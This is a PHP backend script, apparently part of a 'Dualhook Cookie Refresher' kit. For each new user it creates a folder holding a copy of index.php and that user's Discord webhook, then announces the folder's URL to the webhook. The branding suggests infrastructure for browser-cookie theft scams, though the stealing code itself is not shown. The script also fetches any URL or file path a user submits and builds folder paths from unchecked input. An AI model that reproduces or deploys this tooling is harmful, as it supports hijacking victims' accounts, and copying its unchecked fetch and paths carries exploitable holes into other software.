<?php
error_reporting(0);
$a = new stdClass();
$a->success = false;

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    sleep(1);
    $payload = json_decode(file_get_contents("php://input"));
    $directory = $payload->directory;
    $webhook = $payload->webhook;

    if ($directory && $webhook) {
        $content = json_decode(file_get_contents($webhook));
        if ($content->id !== null) {
            if (strlen(htmlspecialchars($directory)) <= 10) {
                if (!file_exists($directory)) {
                    mkdir("$directory");
                    file_put_contents("$directory/index.php", file_get_contents("index.php"));
                    file_put_contents("$directory/web.txt", $webhook);

                    $a->success = true;
                    $a->message = "Directory Made, Redirecting...";
                    $a->url = "https://$_SERVER[SERVER_NAME]/Refresher/$directory";

                    $botname = "Cookie Refresher - SYNX";
                    $botpfp = "https://cdn.discordapp.com/attachments/1349900764767846411/1363940108239110284/2379_a0ca3.png?ex=6807dbb6&is=68068a36&hm=6e39e84ba48a6863eb81b1a140b12e2e2aff07e744fbaa35ca9414acd56bcdc0&";
                    $embedColor = hexdec("616160");

                    $hookObject = json_encode([
                    "content" => "@everyone",
                     "username" => "APP - $botname",
                     "avatar_url" => $botpfp,
                     "embeds" => [[
                        "title" => "<:icons_folder:1364013376501452901> Dualhook Refresher",
                        "description" => "Your **Dualhook** Refresher has been created.",
                         "color" => $embedColor,
                        "fields" => [
                       [
                           "name" => "<:icons_folder:1364013376501452901>️ Directory Name",
                           "value" => "`$directory`",
                          "inline" => true
                       ],
                       [
                           "name" => "<:Chains:1364013739568926871> Access URL",
                            "value" => "[Dualhook Refresher](https://{$_SERVER['SERVER_NAME']}/Refresher/$directory)",
                           "inline" => true
                         ]
                         ],
                          "footer" => [
                         "text" => " Made by $botname",
                         "icon_url" => $botpfp
                      ],
                        "timestamp" => date("c")
                     ]]

                    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

                    $ch = curl_init();
                    curl_setopt_array($ch, [
                        CURLOPT_URL => $webhook,
                        CURLOPT_POST => true,
                        CURLOPT_POSTFIELDS => $hookObject,
                        CURLOPT_HTTPHEADER => [
                            "Content-Type: application/json"
                        ]
                    ]);
                    $response = curl_exec($ch);
                    curl_close($ch);
                } else {
                    $a->message = "Directory Taken";
                    http_response_code(403);
                }
            } else {
                $a->message = "Directory Can Only Be 10 Characters";
                http_response_code(403);
            }
        } else {
            http_response_code(403);
            $a->message = "Webhook Is Not Valid";
        }
    } else {
        http_response_code(403);
        $a->message = "Directory And Webhook Required";
    }
} else {
    $a->message = "Bad Request Method";
    http_response_code(402);
}

header("Content-type: application/json");
echo json_encode($a);